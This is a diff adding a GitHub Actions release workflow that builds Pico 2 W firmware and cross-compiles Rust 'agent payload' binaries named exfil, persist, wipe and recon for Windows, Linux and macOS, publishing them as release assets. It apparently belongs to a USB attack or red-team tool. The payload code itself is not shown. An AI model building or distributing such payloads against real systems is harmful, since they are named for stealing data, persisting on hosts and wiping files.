@@ -1,0 +1,306 @@
+name: Release
+
+on:
+  push:
+    tags:
+      - 'v*'
+  workflow_dispatch:
+    inputs:
+      release_tag:
+        description: Existing v* tag whose release assets will be replaced
+        required: true
+        type: string
+      build_ref:
+        description: Branch or commit to build from (defaults to main)
+        required: false
+        default: main
+        type: string
+
+permissions:
+  contents: write
+
+jobs:
+  # ── Frozen firmware ──────────────────────────────────────────────────────────
+  build-uf2:
+    name: Build Frozen UF2
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Validate manual release tag
+        if: github.event_name == 'workflow_dispatch'
+        run: |
+          case "${{ inputs.release_tag }}" in
+            v*) ;;
+            *)
+              echo "release_tag must start with v"
+              exit 1
+              ;;
+          esac
+
+      - name: Checkout code
+        uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event_name == 'workflow_dispatch' && inputs.build_ref || github.ref }}
+
+      - name: Set up uv
+        uses: astral-sh/setup-uv@v4
+        with:
+          python-version: '3.14'
+
+      - name: Install build dependencies
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y build-essential cmake gcc-arm-none-eabi libnewlib-arm-none-eabi ninja-build
+
+      - name: Install Python dependencies
+        run: uv sync
+
+      - name: Verify source tree
+        run: |
+          if [ -d scripts ]; then
+            uv run python -c "from scripts.asset_pipeline import sync_web_assets; sync_web_assets(check=True)"
+            uv run ruff check build.py release.py scripts src tests
+          else
+            uv run python -c "from asset_pipeline import sync_web_assets; sync_web_assets(check=True)"
+            uv run ruff check asset_pipeline.py build.py build_support.py release.py src tests
+          fi
+          uv run pytest
+
+      - name: Build frozen firmware
+        run: |
+          uv run python release.py build-uf2 \
+            --micropython-ref v1.28.0 \
+            --board RPI_PICO2_W \
+            --release-version "${{ github.event_name == 'workflow_dispatch' && inputs.release_tag || github.ref_name }}"
+
+      - name: Upload workflow artifacts
+        uses: actions/upload-artifact@v4
+        with:
+          name: pico-bit-uf2
+          path: |
+            dist/*.uf2
+            dist/release.json
+
+      - name: Publish release assets
+        uses: softprops/action-gh-release@v2
+        with:
+          tag_name: ${{ github.event_name == 'workflow_dispatch' && inputs.release_tag || github.ref_name }}
+          files: |
+            dist/*.uf2
+            dist/release.json
+
+  # ── Agent payloads — Windows (x86_64 + arm64) ───────────────────────────────
+  #
+  # Targets:  x86_64-pc-windows-gnullvm   → recon-x86_64.exe  etc.
+  #           aarch64-pc-windows-gnullvm  → recon-arm64.exe   etc.
+  #
+  # Both UCRT-based; cargo-zigbuild drives Zig as the cross-linker so no
+  # separate MinGW toolchain is needed for either architecture.
+  build-agents-windows:
+    name: Build Agent Payloads (Windows x86_64 + arm64)
+    needs: build-uf2
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event_name == 'workflow_dispatch' && inputs.build_ref || github.ref }}
+
+      - name: Install Rust toolchain
+        uses: dtolnay/rust-toolchain@stable
+        with:
+          targets: x86_64-pc-windows-gnullvm,aarch64-pc-windows-gnullvm
+
+      - name: Cache Rust dependencies
+        uses: Swatinem/rust-cache@v2
+        with:
+          workspaces: agent
+          key: windows-dual
+
+      - name: Install Zig
+        run: pip3 install ziglang
+
+      - name: Install cargo-zigbuild
+        uses: taiki-e/install-action@v2
+        with:
+          tool: cargo-zigbuild
+
+      - name: Build x86_64 payloads
+        working-directory: agent
+        run: |
+          cargo zigbuild --release --target x86_64-pc-windows-gnullvm --bin exfil
+          cargo zigbuild --release --target x86_64-pc-windows-gnullvm --bin persist
+          cargo zigbuild --release --target x86_64-pc-windows-gnullvm --bin wipe
+          cargo zigbuild --release --target x86_64-pc-windows-gnullvm --bin recon --features with-sysinfo
+
+      - name: Build arm64 payloads
+        working-directory: agent
+        run: |
+          cargo zigbuild --release --target aarch64-pc-windows-gnullvm --bin exfil
+          cargo zigbuild --release --target aarch64-pc-windows-gnullvm --bin persist
+          cargo zigbuild --release --target aarch64-pc-windows-gnullvm --bin wipe
+          cargo zigbuild --release --target aarch64-pc-windows-gnullvm --bin recon --features with-sysinfo
+
+      - name: Package into zip
+        working-directory: agent
+        run: |
+          mkdir -p dist/windows
+          for bin in exfil persist wipe recon; do
+            cp target/x86_64-pc-windows-gnullvm/release/${bin}.exe  dist/windows/${bin}-x86_64.exe
+            cp target/aarch64-pc-windows-gnullvm/release/${bin}.exe dist/windows/${bin}-arm64.exe
+          done
+          cd dist && zip -r payloads-windows.zip windows/
+
+      - name: Upload workflow artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: payloads-windows
+          path: agent/dist/payloads-windows.zip
+
+      - name: Publish release asset
+        uses: softprops/action-gh-release@v2
+        with:
+          tag_name: ${{ github.event_name == 'workflow_dispatch' && inputs.release_tag || github.ref_name }}
+          files: agent/dist/payloads-windows.zip
+
+  # ── Agent payloads — Linux (x86_64 + arm64, static musl) ────────────────────
+  #
+  # Targets:  x86_64-unknown-linux-musl   → recon-x86_64  etc.
+  #           aarch64-unknown-linux-musl  → recon-arm64   etc.
+  #
+  # cargo-zigbuild embeds Zig's musl libc so no system cross-compiler is needed.
+  build-agents-linux:
+    name: Build Agent Payloads (Linux x86_64 + arm64, musl)
+    needs: build-uf2
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event_name == 'workflow_dispatch' && inputs.build_ref || github.ref }}
+
+      - name: Install Rust toolchain
+        uses: dtolnay/rust-toolchain@stable
+        with:
+          targets: x86_64-unknown-linux-musl,aarch64-unknown-linux-musl
+
+      - name: Cache Rust dependencies
+        uses: Swatinem/rust-cache@v2
+        with:
+          workspaces: agent
+          key: linux-dual
+
+      - name: Install Zig
+        run: pip3 install ziglang
+
+      - name: Install cargo-zigbuild
+        uses: taiki-e/install-action@v2
+        with:
+          tool: cargo-zigbuild
+
+      - name: Build x86_64 payloads
+        working-directory: agent
+        run: |
+          cargo zigbuild --release --target x86_64-unknown-linux-musl --bin exfil
+          cargo zigbuild --release --target x86_64-unknown-linux-musl --bin persist
+          cargo zigbuild --release --target x86_64-unknown-linux-musl --bin wipe
+          cargo zigbuild --release --target x86_64-unknown-linux-musl --bin recon --features with-sysinfo
+
+      - name: Build arm64 payloads
+        working-directory: agent
+        run: |
+          cargo zigbuild --release --target aarch64-unknown-linux-musl --bin exfil
+          cargo zigbuild --release --target aarch64-unknown-linux-musl --bin persist
+          cargo zigbuild --release --target aarch64-unknown-linux-musl --bin wipe
+          cargo zigbuild --release --target aarch64-unknown-linux-musl --bin recon --features with-sysinfo
+
+      - name: Package into zip
+        working-directory: agent
+        run: |
+          mkdir -p dist/linux
+          for bin in exfil persist wipe recon; do
+            cp target/x86_64-unknown-linux-musl/release/${bin}   dist/linux/${bin}-x86_64
+            cp target/aarch64-unknown-linux-musl/release/${bin}  dist/linux/${bin}-arm64
+          done
+          cd dist && zip -r payloads-linux.zip linux/
+
+      - name: Upload workflow artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: payloads-linux
+          path: agent/dist/payloads-linux.zip
+
+      - name: Publish release asset
+        uses: softprops/action-gh-release@v2
+        with:
+          tag_name: ${{ github.event_name == 'workflow_dispatch' && inputs.release_tag || github.ref_name }}
+          files: agent/dist/payloads-linux.zip
+
+  # ── Agent payloads — macOS (x86_64 + arm64) ─────────────────────────────────
+  #
+  # Targets:  aarch64-apple-darwin  → recon-arm64   etc.  (native on M1 runner)
+  #           x86_64-apple-darwin   → recon-x86_64  etc.  (Apple SDK cross)
+  #
+  # Both arches are cross-compiled by the standard Apple LLVM on macos-14;
+  # no extra toolchain is needed.
+  build-agents-macos:
+    name: Build Agent Payloads (macOS x86_64 + arm64)
+    needs: build-uf2
+    runs-on: macos-14
+
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event_name == 'workflow_dispatch' && inputs.build_ref || github.ref }}
+
+      - name: Install Rust toolchain
+        uses: dtolnay/rust-toolchain@stable
+        with:
+          targets: aarch64-apple-darwin,x86_64-apple-darwin
+
+      - name: Cache Rust dependencies
+        uses: Swatinem/rust-cache@v2
+        with:
+          workspaces: agent
+          key: macos-dual
+
+      - name: Build arm64 payloads
+        working-directory: agent
+        run: |
+          cargo build --release --target aarch64-apple-darwin --bin exfil
+          cargo build --release --target aarch64-apple-darwin --bin persist
+          cargo build --release --target aarch64-apple-darwin --bin wipe
+          cargo build --release --target aarch64-apple-darwin --bin recon --features with-sysinfo
+
+      - name: Build x86_64 payloads
+        working-directory: agent
+        run: |
+          cargo build --release --target x86_64-apple-darwin --bin exfil
+          cargo build --release --target x86_64-apple-darwin --bin persist
+          cargo build --release --target x86_64-apple-darwin --bin wipe
+          cargo build --release --target x86_64-apple-darwin --bin recon --features with-sysinfo
+
+      - name: Package into zip
+        working-directory: agent
+        run: |
+          mkdir -p dist/macos
+          for bin in exfil persist wipe recon; do
+            cp target/aarch64-apple-darwin/release/${bin}  dist/macos/${bin}-arm64
+            cp target/x86_64-apple-darwin/release/${bin}   dist/macos/${bin}-x86_64
+          done
+          cd dist && zip -r payloads-macos.zip macos/
+
+      - name: Upload workflow artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: payloads-macos
+          path: agent/dist/payloads-macos.zip
+
+      - name: Publish release asset
+        uses: softprops/action-gh-release@v2
+        with:
+          tag_name: ${{ github.event_name == 'workflow_dispatch' && inputs.release_tag || github.ref_name }}
+          files: agent/dist/payloads-macos.zip
